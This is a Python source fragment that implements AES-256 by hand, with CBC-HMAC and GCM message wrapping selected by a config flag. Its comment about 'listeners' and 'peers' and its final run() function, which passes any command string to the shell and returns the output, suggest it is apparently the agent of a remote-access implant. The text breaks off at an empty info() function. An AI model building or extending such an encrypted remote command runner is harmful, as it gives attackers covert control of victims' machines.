def _xt(a):
    a <<= 1
    return (a ^ 0x1b) & 0xff if a & 0x100 else a


def _mul(a, b):
    r = 0
    while b:
        if b & 1:
            r ^= a
        a = _xt(a)
        b >>= 1
    return r


def expand(key):
    # AES-256: Nk=8, Nr=14, 60 words
    w = [list(key[i:i + 4]) for i in range(0, 32, 4)]
    for i in range(8, 60):
        t = list(w[i - 1])
        if i % 8 == 0:
            t = t[1:] + t[:1]
            t = [SBOX[x] for x in t]
            t[0] ^= RCON[i // 8 - 1]
        elif i % 8 == 4:
            t = [SBOX[x] for x in t]
        w.append([w[i - 8][j] ^ t[j] for j in range(4)])
    return w


def _shift_rows(s):
    out = [0] * 16
    for c in range(4):
        for r in range(4):
            out[c * 4 + r] = s[((c + r) % 4) * 4 + r]
    return out


def _mix_columns(s):
    out = [0] * 16
    for c in range(4):
        a = s[c * 4:c * 4 + 4]
        out[c * 4 + 0] = _mul(a[0], 2) ^ _mul(a[1], 3) ^ a[2] ^ a[3]
        out[c * 4 + 1] = a[0] ^ _mul(a[1], 2) ^ _mul(a[2], 3) ^ a[3]
        out[c * 4 + 2] = a[0] ^ a[1] ^ _mul(a[2], 2) ^ _mul(a[3], 3)
        out[c * 4 + 3] = _mul(a[0], 3) ^ a[1] ^ a[2] ^ _mul(a[3], 2)
    return out


def aes256_block(block, w):
    s = [block[i] ^ w[i // 4][i % 4] for i in range(16)]
    for rnd in range(1, 15):
        s = [SBOX[x] for x in s]
        s = _shift_rows(s)
        if rnd != 14:
            s = _mix_columns(s)
        s = [s[i] ^ w[rnd * 4 + i // 4][i % 4] for i in range(16)]
    return bytes(s)


def _inv_shift_rows(s):
    out = [0] * 16
    for c in range(4):
        for r in range(4):
            out[((c + r) % 4) * 4 + r] = s[c * 4 + r]
    return out


def _inv_mix_columns(s):
    out = [0] * 16
    for c in range(4):
        a = s[c * 4:c * 4 + 4]
        out[c * 4 + 0] = _mul(a[0], 14) ^ _mul(a[1], 11) ^ _mul(a[2], 13) ^ _mul(a[3], 9)
        out[c * 4 + 1] = _mul(a[0], 9) ^ _mul(a[1], 14) ^ _mul(a[2], 11) ^ _mul(a[3], 13)
        out[c * 4 + 2] = _mul(a[0], 13) ^ _mul(a[1], 9) ^ _mul(a[2], 14) ^ _mul(a[3], 11)
        out[c * 4 + 3] = _mul(a[0], 11) ^ _mul(a[1], 13) ^ _mul(a[2], 9) ^ _mul(a[3], 14)
    return out


def aes256_decrypt(block, w):
    s = [block[i] ^ w[14 * 4 + i // 4][i % 4] for i in range(16)]
    for rnd in range(13, -1, -1):
        s = _inv_shift_rows(s)
        s = [INV_SBOX[x] for x in s]
        s = [s[i] ^ w[rnd * 4 + i // 4][i % 4] for i in range(16)]
        if rnd != 0:
            s = _inv_mix_columns(s)
    return bytes(s)


def _pkcs7(x):
    n = 16 - len(x) % 16
    return x + bytes([n]) * n


def _unpkcs7(x):
    n = x[-1]
    if n < 1 or n > 16:
        raise Exception('bad padding')
    return x[:-n]


def derive(keyb, label):
    return hashlib.sha256(base64.b64decode(keyb) + label.encode()).digest()


def enc(keyb, pt):
    import os
    k = derive(keyb, 'enc')
    w = expand(k)
    iv = os.urandom(16)
    d = _pkcs7(pt.encode())
    ct = b''
    prev = iv
    for i in range(0, len(d), 16):
        blk = [d[i + j] ^ prev[j] for j in range(16)]
        out = aes256_block(blk, w)
        ct += out
        prev = out
    mac = hmac.new(derive(keyb, 'mac'), iv + ct, hashlib.sha256).digest()
    return base64.b64encode(iv + ct + mac).decode()


def dec(keyb, ctb):
    r = base64.b64decode(ctb)
    if len(r) < 48:
        raise Exception('short')
    iv, ct, mac = r[:16], r[16:-32], r[-32:]
    if not hmac.compare_digest(mac, hmac.new(derive(keyb, 'mac'), iv + ct, hashlib.sha256).digest()):
        raise Exception('mac')
    w = expand(derive(keyb, 'enc'))
    d = b''
    prev = iv
    for i in range(0, len(ct), 16):
        blk = ct[i:i + 16]
        d += bytes(x ^ y for x, y in zip(aes256_decrypt(list(blk), w), prev))
        prev = blk
    return _unpkcs7(d).decode()

# AES-GCM for explicit GCM listeners; CBC-HMAC remains available for legacy peers.
_cbc_enc, _cbc_dec = enc, dec
def _mul128(x,y):
 z=0
 for i in range(128):
  if (x>>(127-i))&1:z^=y
  y=(y>>1)^((0xe1<<120) if y&1 else 0)
 return z
def _ghash(h,a):
 y=0
 for i in range(0,len(a),16):y=_mul128(y^int.from_bytes(a[i:i+16].ljust(16,b'\0'),'big'),h)
 return y
def _gcm_tag(w,nonce,ct):
 h=int.from_bytes(aes256_block([0]*16,w),'big')
 data=ct+b'\0'*((-len(ct))%16)+struct.pack('>QQ',0,len(ct)*8)
 v=_ghash(h,data)
 return bytes(a^b for a,b in zip(aes256_block(list(nonce+b'\0\0\0\1'),w),v.to_bytes(16,'big')))
def _gcm_xor(w,nonce,data):
 out=b''
 for i in range(0,len(data),16):
  block=aes256_block(list(nonce+struct.pack('>I',2+i//16)),w)
  out+=bytes(x^y for x,y in zip(data[i:i+16],block))
 return out
def enc(keyb,pt):
 if C.get('envelope')!='gcm':return _cbc_enc(keyb,pt)
 w=expand(base64.b64decode(keyb));nonce=os.urandom(12);ct=_gcm_xor(w,nonce,pt.encode())
 return base64.b64encode(nonce+ct+_gcm_tag(w,nonce,ct)).decode()
def dec(keyb,ctb):
 if C.get('envelope')!='gcm':return _cbc_dec(keyb,ctb)
 r=base64.b64decode(ctb)
 if len(r)<28:raise ValueError('short GCM message')
 nonce,ct,tag=r[:12],r[12:-16],r[-16:];w=expand(base64.b64decode(keyb))
 if not hmac.compare_digest(tag,_gcm_tag(w,nonce,ct)):raise ValueError('GCM authentication failed')
 return _gcm_xor(w,nonce,ct).decode()

def run(cmd):
 try:
  p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)
  return p.stdout+p.stderr
 except Exception as e:return str(e)
def info():
